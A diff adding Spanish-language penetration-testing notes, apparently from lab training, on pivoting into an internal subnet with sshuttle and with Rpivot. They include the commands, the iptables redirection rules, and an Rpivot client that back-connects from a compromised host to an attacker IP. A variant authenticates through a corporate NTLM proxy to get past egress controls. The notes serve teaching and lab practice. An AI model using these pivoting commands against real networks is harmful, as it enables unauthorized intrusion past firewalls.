@@ -795,3 +795,106 @@ Con Proxifier activo, corres `mstsc.exe` (el cliente RDP nativo de Windows) norm
 # SSH Pivoting with Sshuttle
 
 **Sshuttle** es una herramienta escrita en Python que logra el mismo objetivo que el combo `ssh -D` + `proxychains`, pero de una forma distinta y más transparente: en vez de interceptar las llamadas de socket de cada programa (como hace `proxychains` con `LD_PRELOAD`), **modifica las reglas de `iptables`** de tu propia máquina para redirigir automáticamente _todo_ el tráfico destinado a una subred específica, a través de un túnel SSH hacia el host pivote.
+### La ventaja clave: no necesitas anteponer nada
+
+Con `proxychains`, cada comando lo tenías que escribir como:
+
+```shell
+proxychains nmap ...
+```
+## Instalación
+
+```shell
+sudo apt-get install sshuttle
+```
+## Levantar el túnel
+
+```shell
+sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
+```
+
+- `sudo`: **necesario**, porque `sshuttle` tiene que modificar las reglas de `iptables` del sistema, algo que requiere privilegios de root.
+- `-r ubuntu@10.129.202.64`: especifica el host **remoto** (el pivote) y el usuario con el que te autenticas por SSH. Internamente, `sshuttle` crea la conexión SSH por ti.
+- `172.16.5.0/23`: la subred que quieres que se enrute a través del pivote. Todo el tráfico de tu máquina dirigido a ese rango pasará por el túnel.
+- `-v`: modo verbose, para ver el detalle de lo que está haciendo (las reglas de iptables, el estado de la conexión, etc.).
+## Tracking SSHUTTLE
+
+Los pasos que ejecuta:
+
+1. **Arranca el firewall manager** (`fw:`), que define el método de redirección — aquí usa `nat` (uno de varios métodos soportados, junto con `nft` o `tproxy` en versiones más nuevas).
+2. **Define qué redirigir y qué excluir:**
+    - Redirige: `172.16.5.0/32` — es decir, la subred que indicaste.
+    - Excluye explícitamente: `127.0.0.1/32` e `::1/128` (loopback), para no interferir con tu propio tráfico local.
+3. **Abre un TCP redirector local** en el puerto `12300` (tanto en IPv4 como IPv6), que es el puerto interno al que `iptables` reenvía el tráfico capturado.
+4. **Se conecta al servidor por SSH** (te pide la contraseña del usuario `ubuntu`), y sube su componente servidor en Python al pivote.
+5. **Configura las reglas de `iptables` en tu máquina**, que son el corazón de la técnica:
+
+```
+iptables -w -t nat -N sshuttle-12300
+iptables -w -t nat -I OUTPUT 1 -j sshuttle-12300
+iptables -w -t nat -I PREROUTING 1 -j sshuttle-12300
+iptables -w -t nat -A sshuttle-12300 -j REDIRECT --dest 172.16.5.0/32 -p tcp --to-ports 12300
+```
+## Usar cualquier herramienta normalmente
+
+```shell
+sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn
+```
+# Web Server Pivoting with Rpivot
+
+>[!Warning]
+>Esta herramienta puede estar obsoleta debido al uso de `python2`.
+
+[Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python2 for SOCKS tunneling.
+
+>[!Important]
+>Se usa cuando el host interno **sí puede salir** a internet (tráfico saliente permitido), pero **nadie puede entrar** hacia él desde fuera (firewall bloqueando todo lo entrante, NAT sin puerto expuesto, etc.). Es el caso típico de un servidor web interno de una organización, donde el firewall permite salida pero no entrada.
+
+```shell
+git clone https://github.com/klsecservices/rpivot.git
+```
+## Levantar el servidor en tu atacante
+
+```shell
+python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+```
+
+- `python2`: Rpivot está escrito en Python 2, no 3 — detalle importante porque Python 2 ya está deprecado y puede que necesites instalarlo aparte.
+- `--server-ip 0.0.0.0`: escucha en todas las interfaces de tu atacante.
+- `--server-port 9999`: el puerto donde **espera la conexión entrante del cliente** (el pivote se conectará aquí).
+- `--proxy-port 9050`: el puerto donde, una vez conectado el cliente, se expone el **proxy SOCKS** utilizable localmente — exactamente el mismo rol que jugaba el `9050` de `ssh -D`.
+
+En este momento, tu atacante está en modo escucha, esperando que algo se conecte al puerto 9999.
+## Llevar la herramienta al host interno
+
+```shell
+scp -r rpivot ubuntu@<IP del objetivo>:/home/ubuntu/
+```
+
+Como Rpivot no es nativo del sistema (a diferencia de Plink en un Windows con PuTTY), tienes que **subir físicamente la carpeta** al host que va a servir de pivote, usando SCP sobre la conexión SSH que ya tienes.
+## Ejecutar el cliente en el pivote
+
+```shell
+python2 client.py --server-ip 10.10.14.18 --server-port 9999
+```
+ 
+- `--server-ip 10.10.14.18`: la IP de tu atacante (no la del pivote — aquí el pivote es quien marca hacia ti).
+- `--server-port 9999`: el mismo puerto que dejaste escuchando en el paso 2.
+
+El mensaje `Backconnecting to server 10.10.14.18 port 9999` confirma que el pivote está **iniciando la conexión saliente** hacia tu atacante — de ahí el "back" en "backconnecting", mismo concepto que una reverse shell.
+## Usar el proxy resultante
+
+```shell
+proxychains firefox-esr 172.16.5.135:80
+```
+### Variante: cuando hay un proxy HTTP con autenticación NTLM en el medio
+
+Algunas organizaciones no permiten salida directa a internet — todo el tráfico saliente tiene que pasar por un **proxy HTTP corporativo** que exige autenticación NTLM contra el Domain Controller. Para ese escenario, Rpivot soporta autenticarse contra ese proxy antes de hacer el backconnect:
+
+```shell
+python client.py --server-ip <IP del server rpivot> --server-port 8080 \
+  --ntlm-proxy-ip <IP del proxy NTLM> --ntlm-proxy-port 8081 \
+  --domain <dominio> --username <usuario> --password <contraseña>
+```
+
+Esto es relevante porque muchas redes empresariales no permiten _ninguna_ conexión saliente directa — solo permiten salir a través de su propio proxy autenticado, así que Rpivot necesita saber hablar ese protocolo intermedio para poder completar el backconnect.
